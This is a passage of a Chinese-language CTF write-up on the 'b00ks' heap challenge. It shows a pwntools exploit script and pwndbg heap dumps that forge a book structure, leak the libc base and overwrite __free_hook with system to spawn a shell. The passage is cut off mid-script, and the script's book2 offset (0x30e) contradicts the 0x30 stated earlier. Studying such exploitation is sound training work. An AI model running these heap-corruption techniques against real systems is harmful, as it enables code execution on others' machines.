+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">add</span>(size1,name,size2,desc):</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="title function_">str</span>(size1))</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(name)</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="title function_">str</span>(size2))</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(desc)</span><br><span class="line"></span><br><span class="line"><span class="title function_">add</span>(<span class="number">0x21000</span>, <span class="string">&#x27;cccc&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">book2_addr = book1_addr + <span class="number">0x30</span></span><br></pre></td></tr></table></figure>
+
+<p>在我们申请一个超过128KB的堆空间时 我们的book2_name和book2_desc确实是存储在mmap申请的很高的堆地址空间中 但是我们的book2_control_heap地址是在book1_control_heap的高0x30处 因为这个control_heap是程序已经定死的 具体可以看sub_F55函数部分</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#<span class="title class_">After</span> <span class="title function_">add</span>(<span class="number">0x21000</span>, <span class="string">&#x27;cccc&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55e1603a8000</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x1011</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55e1603a9010</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0xa1</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55e1603a90b0</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0xa1</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span>        &lt;---  book1_control_heap</span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55e1603a9150</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span>        &lt;---  book2_control_heap</span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55e1603a9180</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Top</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55e1603a91b0</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x20e51</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x55e1603a9180</span></span><br><span class="line"><span class="number">0x55e1603a9180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x55e1603a9190</span>:	<span class="number">0x0000000000000002</span>	<span class="number">0x00007fb66514a010</span></span><br><span class="line"><span class="number">0x55e1603a91a0</span>:	<span class="number">0x00007fb665128010</span>	<span class="number">0x0000000000021000</span></span><br><span class="line"><span class="number">0x55e1603a91b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020e51</span></span><br><span class="line"><span class="number">0x55e1603a91c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e1603a91d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>至此 book2_control_heap的地址获得了 book1的+0x30即可</p>
+<h2 id="伪造HEAP"><a href="#伪造HEAP" class="headerlink" title="伪造HEAP"></a>伪造HEAP</h2><p>程序输入的逻辑是这样的</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> bss + <span class="number">0x202040</span>:author_name</span><br><span class="line"><span class="number">2.</span> bss + <span class="number">0x202060</span>:book1_control_heap</span><br><span class="line"><span class="number">3.</span> bss + <span class="number">0x202060</span> + <span class="number">0x8</span>:book2_control_heap</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>所以第一次输入的author_name其实覆盖不了book1_control_heap 先后顺序的原因 所以得create book1之后再进行一次输入 才能覆盖 代码我就不贴了 注意我重新调试了一下 不要纠结于上面的那些地址</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx <span class="number">0x55f743a7e000</span> + <span class="number">0x202040</span></span><br><span class="line"><span class="number">0x55f743c80040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55f743c80050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55f743c80060</span>:	<span class="number">0x000055f7450e8100</span>	<span class="number">0x000055f7450e8190</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55f7450e7000</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x1011</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55f7450e8010</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0xa1</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55f7450e80b0</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0xa1</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55f7450e8150</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55f7450e8180</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Top</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55f7450e81b0</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x20e51</span></span><br></pre></td></tr></table></figure>
+
+<p>我们将book1_control_heap的地址覆盖成了0x55f7450e8100 也就是说我们要在这个地址上伪造一个堆 对于我们伪造的这个堆而言 他的地址处于book1_desc与book1_control_heap之间 那么为了我们堆空间利用难度而言 我们伪造的这个堆地址需要尽可能靠近book1_desc 也要尽可能远离book1_control_heap 这需要以下两点</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>book1_desc的堆空间要适度</span><br><span class="line"><span class="number">2.</span>book1_name的堆空间大小要多次调试 防止book1_desc的堆起始地址过高</span><br><span class="line"></span><br><span class="line">#exp</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span> + <span class="title function_">p64</span>(<span class="number">1</span>) + <span class="title function_">p64</span>(book2_addr + <span class="number">0x8</span>) * <span class="number">2</span> + <span class="title function_">p64</span>(<span class="number">0x1000</span>)</span><br><span class="line"><span class="title function_">edit</span>(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">#伪造后的情况如下</span><br><span class="line">pwndbg&gt; x/20gx  <span class="number">0x55f7450e80b0</span></span><br><span class="line"><span class="number">0x55f7450e80b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000a1</span></span><br><span class="line"><span class="number">0x55f7450e80c0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55f7450e80d0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55f7450e80e0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55f7450e80f0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55f7450e8100</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055f7450e8198</span></span><br><span class="line"><span class="number">0x55f7450e8110</span>:	<span class="number">0x000055f7450e8198</span>	<span class="number">0x0000000000001000</span></span><br><span class="line"><span class="number">0x55f7450e8120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>我们肯定只能从book1_desc入手修改 程序正好提供了修改的函数 不然得覆盖好多数据 我们伪造的是book1 所以id是1 至于name和desc无所谓都用book2的name即可 反正只需要打印出其中一个地址就行 用自带的show打印出其中一个地址 与libc相减做差后就可以得到libc基地址 不过这个基地址每个人不一样</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span> + <span class="title function_">p64</span>(<span class="number">1</span>) + <span class="title function_">p64</span>(book2_addr + <span class="number">0x8</span>) * <span class="number">2</span> + <span class="title function_">p64</span>(<span class="number">0x1000</span>)</span><br><span class="line"><span class="title function_">edit</span>(<span class="number">1</span>,payload)</span><br><span class="line"><span class="title function_">change_name</span>()</span><br><span class="line"><span class="title function_">show</span>()</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">book2_name_addr = <span class="title function_">u64</span>(sh.<span class="title function_">recv</span>(<span class="number">6</span>).<span class="title function_">ljust</span>(<span class="number">8</span>,<span class="string">&#x27;\\0&#x27;</span>))</span><br><span class="line">print <span class="title function_">hex</span>(book2_name_addr)</span><br><span class="line"></span><br><span class="line">libc_base = book2_name_addr - <span class="number">0x5b1010</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="FREE-HOOK"><a href="#FREE-HOOK" class="headerlink" title="FREE_HOOK"></a>FREE_HOOK</h2><p>free_hook的作用就是在malloc或者free他时 会去调用这个指针所指向的东西 好好使用功能是很强大的 但是如果存了system 危害也是极大的</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( i != <span class="number">20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="title function_">free</span>(*(<span class="keyword">void</span> **)(*((_QWORD *)off_202010 + i) + 8LL));</span><br><span class="line">      <span class="title function_">free</span>(*(<span class="keyword">void</span> **)(*((_QWORD *)off_202010 + i) + 16LL));</span><br><span class="line">      <span class="title function_">free</span>(*((<span class="keyword">void</span> **)off_202010 + i));</span><br><span class="line">      *((_QWORD *)off_202010 + i) = 0LL;</span><br><span class="line">      <span class="keyword">return</span> 0LL;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于此题而言唯一可控的free在del book处 逐个free掉book_name和book_desc 不过由于我们执行的system需要参数 所以free_hook写在book_desc上</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">edit</span>(<span class="number">1</span>, <span class="title function_">p64</span>(binsh) + <span class="title function_">p64</span>(free_hook))</span><br><span class="line"><span class="title function_">edit</span>(<span class="number">2</span>, <span class="title function_">p64</span>(system_addr))</span><br></pre></td></tr></table></figure>
+
+<p>要执行system的话 我们需要往free_hook所指向的地址写入system 回顾一下我们写入的free_hook地址 在我们伪造的book1_desc处</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55c269fb6000</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x1011</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55c269fb7010</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0xa1</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55c269fb70b0</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0xa1</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55c269fb7150</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Allocated</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55c269fb7180</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Top</span> chunk | <span class="variable constant_">PREV_INUSE</span></span><br><span class="line"><span class="title class_">Addr</span>: <span class="number">0x55c269fb71b0</span></span><br><span class="line"><span class="title class_">Size</span>: <span class="number">0x20e51</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x55c269fb70b0</span></span><br><span class="line"><span class="number">0x55c269fb70b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000a1</span>.   real_book_control_heap</span><br><span class="line"><span class="number">0x55c269fb70c0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c269fb70d0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c269fb70e0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c269fb70f0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c269fb7100</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c269fb7198</span>    fake_book1_conrol_heap</span><br><span class="line"><span class="number">0x55c269fb7110</span>:	<span class="number">0x000055c269fb7198</span>	<span class="number">0x0000000000001000</span></span><br><span class="line"><span class="number">0x55c269fb7120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c269fb7130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c269fb7140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x55c269fb7180</span></span><br><span class="line"><span class="number">0x55c269fb7180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x55c269fb7190</span>:	<span class="number">0x0000000000000002</span>	<span class="number">0x00007ff5d5007e57</span>     book2_control_heap</span><br><span class="line"><span class="number">0x55c269fb71a0</span>:	<span class="number">0x00007ff5d52417a8</span>	<span class="number">0x0000000000021000</span></span><br><span class="line"><span class="number">0x55c269fb71b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020e51</span></span><br><span class="line"><span class="number">0x55c269fb71c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c269fb71d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c269fb71e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c269fb71f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c269fb7200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c269fb7210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>肯定有人有疑问为啥还要兜一圈用伪造的book1_control_heap写入book2_name和book2_desc数据呢 不是可以直接edit(2)吗 这是因为如果直接edit(2) 那么我们写入的地址是用mmap生成的一个很高的地址 这个地址我们是无法泄漏的 顶天写入free_hook 无法下一步操作 但是如果我们用fake_book_name和desc进行写入的话 我们写入的是上图中的0x55c269fb7198 而这个地址我们就算不调试也是已知的 允许二次写入</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = <span class="title function_">process</span>(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">elf = <span class="title function_">ELF</span>(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">libc = elf.<span class="property">libc</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">change_name</span>():</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">add</span>(size1,name,size2,desc):</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="title function_">str</span>(size1))</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(name)</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="title function_">str</span>(size2))</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(desc)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">edit</span>(id,payload):</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter the book id you want to edit:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="title function_">str</span>(id))</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter new book description:&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(payload)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">show</span>():</span><br><span class="line">    sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendline</span>(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">free</span>(index):</span><br><span class="line">    sh.<span class="title function_">sendlineafter</span>(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.<span class="title function_">sendlineafter</span>(<span class="string">&#x27;: &#x27;</span>, <span class="title function_">str</span>(index))</span><br><span class="line"></span><br><span class="line">#gdb.<span class="title function_">attach</span>(sh)</span><br><span class="line"></span><br><span class="line">sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">sh.<span class="title function_">sendline</span>(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line"><span class="title function_">add</span>(<span class="number">0x90</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x90</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_">show</span>()</span><br><span class="line">sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">book1_addr = <span class="title function_">u64</span>(sh.<span class="title function_">recv</span>(<span class="number">6</span>).<span class="title function_">ljust</span>(<span class="number">8</span>,<span class="string">&#x27;\\0&#x27;</span>))</span><br><span class="line">book2_addr = book1_addr + <span class="number">0x30e</span></span><br><span class="line">print (<span class="string">&#x27;book1_addr = &#x27;</span>, <span class="title function_">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line"><span class="title function_">add</span>(<span class="number">0x21000</span>, <span class="string">&#x27;cccc&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span> + <span class="title function_">p64</span>(<span class="number">1</span>) + <span class="title function_">p64</span>(book2_addr + <span class="number">0x8</span>) * <span class="number">2</span> + <span class="title function_">p64</span>(<span class="number">0x1000</span>)</span><br><span class="line"><span class="title function_">edit</span>(<span class="number">1</span>,payload)</span><br><span class="line"><span class="title function_">change_name</span>()</span><br><span class="line"><span class="title function_">show</span>()</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">sh.<span class="title function_">recvuntil</span>(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">book2_name_addr = <span class="title function_">u64</span>(sh.<span class="title function_">recv</span>(<span class="number">6</span>).<span class="title function_">ljust</span>(<span class="number">8</span>,<span class="string">&#x27;\\0&#x27;</span>))</span><br><span class="line">print <span class="title function_">hex</span>(book2_name_addr)</span><br><span class="line"></span><br><span class="line">libc_base = book2_name_addr - <span class="number">0x5b1010</span></span><br><span class="line">free_hook = libc_base + libc.<span class="property">sym</span>[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.<span class="property">sym</span>[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.<span class="title function_">search</span>(<span 